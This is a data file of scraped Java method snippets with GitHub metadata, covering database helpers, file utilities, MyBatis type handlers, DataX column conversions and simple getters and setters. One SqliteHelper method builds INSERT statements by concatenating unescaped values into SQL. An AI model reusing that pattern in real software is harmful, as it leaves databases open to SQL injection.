fetchResourceIdOrderedList(final int projectId) {    try {      return this.databaseOperator.query(SQL_FETCH_PVR,          rs -> {            final List<String> results = new ArrayList<>();            while (rs.next()) {              results.add(rs.getString(1));            }            return results;          }, projectId);    } catch (final SQLException e) {      log.error(\"Error performing cleanup of Project: \" + projectId, e);    }    return Collections.emptyList();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/storage/StorageCleaner.java", "stars": "18", "class": {"name": "StorageCleaner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAppPath", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getAppPath(String name) {        StringBuilder sb = new StringBuilder();        sb.append(SD_PATH);        sb.append(File.separator);        sb.append(name);        sb.append(File.separator);        return sb.toString();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/FileUtils.java", "stars": "2", "class": {"name": "FileUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPath", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getPath() {        String path = getAppPath(NAME);        File file = new File(path);        if (!file.exists()) {            file.mkdirs();        }        return path;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/FileUtils.java", "stars": "2", "class": {"name": "FileUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTestPath", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getTestPath() {        String path = getAppPath(NAME_TEST);        File file = new File(path);        if (!file.exists()) {            file.mkdirs();        }        return path;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/FileUtils.java", "stars": "2", "class": {"name": "FileUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "deleteFiles", "params": ["File"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void deleteFiles(File root) {        File files[] = root.listFiles();        if (files != null) {            for (File f : files) {                if (!f.isDirectory() && f.exists()) { // \u5224\u65ad\u662f\u5426\u5b58\u5728                    try {                        f.delete();                    } catch (Exception e) {                        e.printStackTrace();                    }                }            }        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/FileUtils.java", "stars": "2", "class": {"name": "FileUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "saveBitmap", "params": ["Bitmap", "File"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void saveBitmap(Bitmap bitmap, File file) {        if (bitmap != null) {            OutputStream outputStream;            try {                outputStream = new FileOutputStream(file);                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, outputStream);                bitmap.recycle();            } catch (FileNotFoundException e) {                e.printStackTrace();            }        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/FileUtils.java", "stars": "2", "class": {"name": "FileUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setNonNullParameter", "params": ["PreparedStatement", "int", "Reader", "JdbcType"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNonNullParameter(PreparedStatement ps, int i, Reader parameter, JdbcType jdbcType)      throws SQLException {    ps.setClob(i, parameter);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobReaderTypeHandler.java", "stars": "15", "class": {"name": "ClobReaderTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "String"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Reader", "snippet": "  public Reader getNullableResult(ResultSet rs, String columnName)      throws SQLException {    return toReader(rs.getClob(columnName));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobReaderTypeHandler.java", "stars": "15", "class": {"name": "ClobReaderTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["ResultSet", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Reader", "snippet": "  public Reader getNullableResult(ResultSet rs, int columnIndex)      throws SQLException {    return toReader(rs.getClob(columnIndex));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobReaderTypeHandler.java", "stars": "15", "class": {"name": "ClobReaderTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNullableResult", "params": ["CallableStatement", "int"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Reader", "snippet": "  public Reader getNullableResult(CallableStatement cs, int columnIndex)      throws SQLException {    return toReader(cs.getClob(columnIndex));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobReaderTypeHandler.java", "stars": "15", "class": {"name": "ClobReaderTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "toReader", "params": ["Clob"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "Reader", "snippet": "  private Reader toReader(Clob clob) throws SQLException {    if (clob == null) {      return null;    } else {      return clob.getCharacterStream();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/ClobReaderTypeHandler.java", "stars": "15", "class": {"name": "ClobReaderTypeHandler", "extends": "BaseTypeHandler", "implements": null, "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["android", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onClick (android.content.DialogInterface p0, int p1)\t{\t\tn_onClick (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/android/support/v7/app/AlertDialog_IDialogInterfaceOnClickListenerImplementor.java", "stars": "2", "class": {"name": "AlertDialog_IDialogInterfaceOnClickListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onClick", "params": ["android", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onClick (android.content.DialogInterface p0, int p1);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/android/support/v7/app/AlertDialog_IDialogInterfaceOnClickListenerImplementor.java", "stars": "2", "class": {"name": "AlertDialog_IDialogInterfaceOnClickListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/android/support/v7/app/AlertDialog_IDialogInterfaceOnClickListenerImplementor.java", "stars": "2", "class": {"name": "AlertDialog_IDialogInterfaceOnClickListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/android/support/v7/app/AlertDialog_IDialogInterfaceOnClickListenerImplementor.java", "stars": "2", "class": {"name": "AlertDialog_IDialogInterfaceOnClickListenerImplementor", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        Scanner in = new Scanner(System.in);        System.out.print(\"Please enter a number: \");//        int a = in.nextInt();//        System.out.println(a);        String s = in.next();        System.out.println(s);    }", "url": "https://raw.githubusercontent.com/kunal-kushwaha/Progate-Java-101/master/src/com/kunal/InputInJava.java", "stars": "1", "class": {"name": "InputInJava", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConnection", "params": ["String"], "throws": ["ClassNotFoundException", "SQLException"], "modifiers": ["public"], "return_type": "Connection", "snippet": "    public Connection getConnection(String dbFilePath) throws ClassNotFoundException, SQLException {        Connection conn = null;        Class.forName(\"org.sqlite.JDBC\");        conn = DriverManager.getConnection(\"jdbc:sqlite:\" + dbFilePath);        return conn;    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeQuery", "params": ["String", "ResultSetExtractor<T>"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T executeQuery(String sql, ResultSetExtractor<T> rse) throws SQLException, ClassNotFoundException {        try {            resultSet = getStatement().executeQuery(sql);            T rs = rse.extractData(resultSet);            return rs;        } finally {            destroyed();        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeQuery", "params": ["String", "RowMapper<T>"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "List<T>", "snippet": "    public <T> List<T> executeQuery(String sql, RowMapper<T> rm) throws SQLException, ClassNotFoundException {        List<T> rsList = new ArrayList<T>();        try {            resultSet = getStatement().executeQuery(sql);            while (resultSet.next()) {                rsList.add(rm.mapRow(resultSet, resultSet.getRow()));            }        } finally {            destroyed();        }        return rsList;    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeUpdate", "params": ["String"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int executeUpdate(String sql) throws SQLException, ClassNotFoundException {        try {            int c = getStatement().executeUpdate(sql);            return c;        } finally {            destroyed();        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeUpdate", "params": ["String"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void executeUpdate(String...sqls) throws SQLException, ClassNotFoundException {        try {            for (String sql : sqls) {                getStatement().executeUpdate(sql);            }        } finally {            destroyed();        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeUpdate", "params": ["List<String>"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void executeUpdate(List<String> sqls) throws SQLException, ClassNotFoundException {        try {            for (String sql : sqls) {                getStatement().executeUpdate(sql);            }        } finally {            destroyed();        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getConnection", "params": [], "throws": ["ClassNotFoundException", "SQLException"], "modifiers": ["private"], "return_type": "Connection", "snippet": "    private Connection getConnection() throws ClassNotFoundException, SQLException {        if (null == connection) connection = getConnection(dbFilePath);        return connection;    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStatement", "params": [], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["private"], "return_type": "Statement", "snippet": "    private Statement getStatement() throws SQLException, ClassNotFoundException {        if (null == statement) statement = getConnection().createStatement();        return statement;    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "destroyed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void destroyed() {        try {            if (null != statement) {                statement.close();                statement = null;            }            if (null != connection) {                connection.close();                connection = null;            }            if (null != resultSet) {                resultSet.close();                resultSet = null;            }        } catch (SQLException e) {            logger.error(\"Sqlite\u6570\u636e\u5e93\u5173\u95ed\u65f6\u5f02\u5e38\", e);        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeQueryList", "params": ["String", "Class<T>"], "throws": ["SQLException", "ClassNotFoundException", "IllegalAccessException", "InstantiationException"], "modifiers": ["public"], "return_type": "List<T>", "snippet": "    public <T> List<T> executeQueryList(String sql, Class<T> clazz) throws SQLException, ClassNotFoundException, IllegalAccessException, InstantiationException {        List<T> rsList = new ArrayList<T>();        try {            resultSet = getStatement().executeQuery(sql);            while (resultSet.next()) {                T t = clazz.newInstance();                for (Field field : t.getClass().getDeclaredFields()) {                    field.setAccessible(true);                    field.set(t,resultSet.getObject(field.getName()));                }                rsList.add(t);            }        } finally {            destroyed();        }        return rsList;    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeQuery", "params": ["String", "Class<T>"], "throws": ["SQLException", "ClassNotFoundException", "IllegalAccessException", "InstantiationException"], "modifiers": ["public"], "return_type": "T", "snippet": "    public <T> T executeQuery(String sql, Class<T> clazz) throws SQLException, ClassNotFoundException, IllegalAccessException, InstantiationException {        try {            resultSet = getStatement().executeQuery(sql);            T t = clazz.newInstance();            for (Field field : t.getClass().getDeclaredFields()) {                field.setAccessible(true);                field.set(t,resultSet.getObject(field.getName()));            }            return t;        } finally {            destroyed();        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "executeInsert", "params": ["String", "Map<String,Object>"], "throws": ["SQLException", "ClassNotFoundException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int executeInsert(String tableName, Map<String,Object> param) throws SQLException, ClassNotFoundException {        try {            StringBuffer sql = new StringBuffer();            sql.append(\"INSERT INTO \");            sql.append(tableName);            sql.append(\" ( \");            for (String key : param.keySet()) {                sql.append(key);                sql.append(\",\");            }            sql.delete(sql.length()-1,sql.length());            sql.append(\")  VALUES ( \");            for (String key : param.keySet()) {                sql.append(\"'\");                sql.append(param.get(key));                sql.append(\"',\");            }            sql.delete(sql.length()-1,sql.length());            sql.append(\");\");            int c = getStatement().executeUpdate(sql.toString());            return c;        } finally {            destroyed();        }    }", "url": "https://raw.githubusercontent.com/sciuridae564/PcrTool/tick/src/main/java/cn/sciuridae/DB/sqLite/SqliteHelper.java", "stars": "2", "class": {"name": "SqliteHelper", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLogger", "params": [], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "java", "snippet": "    public static java.util.logging.Logger getLogger() throws IOException {        if (log == null) {            log = java.util.logging.Logger.getLogger(\"SimpleJava\");            log.setLevel(Level.ALL);            ConsoleHandler consoleHandler = new ConsoleHandler();            consoleHandler.setFormatter(new SimpleFormatter(){                @Override                public String format(LogRecord record) {                    SimpleDateFormat simpleDateFormat = new SimpleDateFormat(\"yyyy-MM-dd hh:mm:ss\");                    String date = simpleDateFormat.format(new Date());                    return \"[\" + date + \"] \" + \"[\" + record.getLevel() + \"] \" + \"[\" + record.getClass().getName() + \"]\" + \"\\t:\" + record.getMessage() + \"\\n\";                }            });            log.addHandler(consoleHandler);            log.setUseParentHandlers(false);        }        return log;    }", "url": "https://raw.githubusercontent.com/qintianchen/GAutomatorView/master/src/sample/utils/Logger.java", "stars": "2", "class": {"name": "Logger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "asBigInteger", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigInteger", "snippet": "    public BigInteger asBigInteger() {        if (null == this.getRawData()) {            return null;        }        return (BigInteger) this.getRawData();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asLong", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long asLong() {        BigInteger rawData = (BigInteger) this.getRawData();        if (null == rawData) {            return null;        }        OverFlowUtil.validateLongNotOverFlow(rawData);        return rawData.longValue();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asDouble", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Double", "snippet": "    public Double asDouble() {        if (null == this.getRawData()) {            return null;        }        BigDecimal decimal = this.asBigDecimal();        OverFlowUtil.validateDoubleNotOverFlow(decimal);        return decimal.doubleValue();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asBoolean", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Boolean", "snippet": "    public Boolean asBoolean() {        if (null == this.getRawData()) {            return null;        }        return this.asBigInteger().compareTo(BigInteger.ZERO) != 0 ? true                : false;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asBigDecimal", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "    public BigDecimal asBigDecimal() {        if (null == this.getRawData()) {            return null;        }        return new BigDecimal(this.asBigInteger());    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String asString() {        if (null == this.getRawData()) {            return null;        }        return ((BigInteger) this.getRawData()).toString();    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date asDate() {        if (null == this.getRawData()) {            return null;        }        return new Date(this.asLong());    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "asBytes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] asBytes() {        throw DataXException.asDataXException(                CommonErrorCode.CONVERT_NOT_SUPPORT, \"Long\u7c7b\u578b\u4e0d\u80fd\u8f6c\u4e3aBytes .\");    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/LongColumn.java", "stars": "23", "class": {"name": "LongColumn", "extends": "Column", "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getId() {        return id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Long id) {        this.id = id;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTitle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {        return title;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTitle", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {        this.title = title;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCover", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCover() {        return cover;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCover", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCover(String cover) {        this.cover = cover;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAuthor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAuthor() {        return author;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAuthor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthor(String author) {        this.author = author;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOrigin", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOrigin() {        return origin;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setOrigin", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrigin(String origin) {        this.origin = origin;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getState() {        return state;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setState", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setState(String state) {        this.state = state;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getViews", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getViews() {        return views;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setViews", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setViews(Long views) {        this.views = views;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getEditTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getEditTime() {        return editTime;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setEditTime", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEditTime(Long editTime) {        this.editTime = editTime;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCreateTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getCreateTime() {        return createTime;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCreateTime", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Long createTime) {        this.createTime = createTime;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getType() {        return type;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setType", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(Integer type) {        this.type = type;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSummary", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSummary() {        return summary;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setSummary", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSummary(String summary) {        this.summary = summary;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getContent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContent() {        return content;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setContent", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContent(String content) {        this.content = content;    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/model/po/Article.java", "stars": "1", "class": {"name": "Article", "extends": null, "implements": null, "modifiers": ["public"]}}, 